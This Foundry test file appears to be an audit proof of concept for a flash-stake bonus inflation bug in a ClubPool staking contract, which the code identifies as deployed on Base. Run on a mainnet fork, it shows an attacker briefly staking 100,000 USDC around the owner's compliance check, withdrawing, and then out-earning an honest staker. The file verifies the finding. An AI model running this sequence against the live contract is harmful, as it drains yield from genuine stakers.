// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {IClubPoolMin, IERC20Min} from "../src/IClubPoolMin.sol";

/// @title F01 - Flash-stake bonus inflation, live fork PoC
/// @notice Interacts with the REAL deployed ClubPool on a Base fork (no redeployment,
///         no source modification). Confirms F01 in RECON/TMAAR/findings/F01-*.md is real,
///         not speculative, per RULES.md #2.
contract F01_FlashStakeBonusInflation is Test {
    IClubPoolMin constant pool = IClubPoolMin(0x1089Db83561d4c9B68350E1c292279817AC6c8DA);
    IERC20Min constant usdc = IERC20Min(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

    address owner;
    // Explicit low vanity addresses (not makeAddr's keccak-derived ones) - on a mainnet
    // fork, a keccak-derived "random" address can coincidentally collide with a real
    // deployed contract, which is exactly what happened here on first run.
    address victim = address(0x00000000000000000000000000000000BEEF01);   // genuine, honest, long-term staker
    address attacker = address(0x00000000000000000000000000000000BEEF02); // stakes big only around the compliance check

    uint256 constant VICTIM_STAKE = 1_000e6;    // 1,000 USDC, real participation
    uint256 constant ATTACKER_REAL_STAKE = 10e6; // 10 USDC, attacker's genuine stake
    uint256 constant ATTACKER_INFLATED_STAKE = 100_000e6; // 100,000 USDC, temporary

    uint256 epoch;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BASE_RPC_URL", string("https://mainnet.base.org")));

        owner = pool.owner();
        epoch = pool.currentEpoch();

        uint256 fee = pool.membershipFee();
        vm.deal(victim, fee);
        vm.deal(attacker, fee);

        // Membership NFTs
        vm.prank(victim);
        pool.mint{value: fee}();
        vm.prank(attacker);
        pool.mint{value: fee}();

        // Fund both with USDC (forge-std deal - finds the real balance storage slot,
        // no special privilege needed, this is a fork-only cheat, not a mainnet action)
        deal(address(usdc), victim, VICTIM_STAKE);
        deal(address(usdc), attacker, ATTACKER_REAL_STAKE + ATTACKER_INFLATED_STAKE);

        // Victim stakes genuinely, well before any compliance check
        vm.startPrank(victim);
        usdc.approve(address(pool), VICTIM_STAKE);
        pool.stake(VICTIM_STAKE);
        vm.stopPrank();

        // Attacker stakes only their real (small) amount for now
        vm.startPrank(attacker);
        usdc.approve(address(pool), ATTACKER_REAL_STAKE + ATTACKER_INFLATED_STAKE);
        pool.stake(ATTACKER_REAL_STAKE);
        vm.stopPrank();
    }

    function test_F01_AttackerInflatesShareThenWithdraws() public {
        // --- Baseline: mark victim compliant honestly ---
        vm.prank(owner);
        pool.recordActivity(victim, true, epoch);

        // --- Attack: inflate stake right before the compliance check ---
        vm.prank(attacker);
        pool.stake(ATTACKER_INFLATED_STAKE);

        vm.prank(owner);
        pool.recordActivity(attacker, true, epoch);

        uint256 frozenAttackerStake = pool.epochAthleteStake(epoch, attacker);
        console2.log("Attacker's frozen epochAthleteStake right after recordActivity:", frozenAttackerStake);
        assertEq(frozenAttackerStake, ATTACKER_REAL_STAKE + ATTACKER_INFLATED_STAKE, "snapshot should include inflated amount");

        // Attacker withdraws the inflated capital IMMEDIATELY - same test, next call
        vm.prank(attacker);
        pool.unstake(ATTACKER_INFLATED_STAKE);

        (, uint256 attackerRealStakeNow,) = pool.athletes(attacker);
        console2.log("Attacker's REAL stake after withdrawing:", attackerRealStakeNow);
        assertEq(attackerRealStakeNow, ATTACKER_REAL_STAKE, "attacker got their inflated capital back");

        // Frozen snapshot used for bonus math is UNCHANGED by the withdrawal - this is the bug
        uint256 frozenAfterWithdraw = pool.epochAthleteStake(epoch, attacker);
        assertEq(frozenAfterWithdraw, frozenAttackerStake, "BUG: frozen bonus-share snapshot survives full withdrawal");

        // --- A later re-confirmation while already compliant is a silent no-op ---
        // (simulates the reporter re-checking activity later in the same 7-day epoch,
        // e.g. a later Strava sync - does NOT correct the stale inflated snapshot)
        vm.prank(owner);
        pool.recordActivity(attacker, true, epoch);
        assertEq(pool.epochAthleteStake(epoch, attacker), frozenAttackerStake, "re-marking compliant=true does not refresh the snapshot");

        // --- Advance to end of epoch, let real Aave yield accrue over the real epochDuration ---
        vm.warp(pool.currentEpochStartTime() + pool.epochDuration());
        pool.endEpoch(); // permissionless

        // --- Both claim ---
        uint256 victimUsdcBefore = usdc.balanceOf(victim);
        uint256 attackerUsdcBefore = usdc.balanceOf(attacker);

        vm.prank(victim);
        pool.claimBonus(epoch);
        vm.prank(attacker);
        pool.claimBonus(epoch);

        uint256 victimBonus = usdc.balanceOf(victim) - victimUsdcBefore;
        uint256 attackerBonus = usdc.balanceOf(attacker) - attackerUsdcBefore;

        console2.log("Victim (1,000 USDC staked the WHOLE epoch) received bonus:", victimBonus);
        console2.log("Attacker (10 USDC real stake, 100,010 USDC for ~0 blocks) received bonus:", attackerBonus);

        uint256 totalWeight = VICTIM_STAKE + ATTACKER_REAL_STAKE + ATTACKER_INFLATED_STAKE;
        console2.log("Attacker's share of the bonus pool (bps):", (attackerBonus * 10_000) / (victimBonus + attackerBonus));
        console2.log("Attacker's share of FROZEN WEIGHT (bps), for reference:", ((ATTACKER_REAL_STAKE + ATTACKER_INFLATED_STAKE) * 10_000) / totalWeight);

        // The attacker, who held real capital in the pool for effectively zero time,
        // walks away with roughly 100x the victim's bonus despite the victim staking
        // 100x more real capital for the WHOLE epoch. That's the bug.
        assertGt(attackerBonus, victimBonus, "BUG CONFIRMED: attacker's near-zero-duration inflated stake out-earns the victim's full-epoch genuine stake");
    }
}
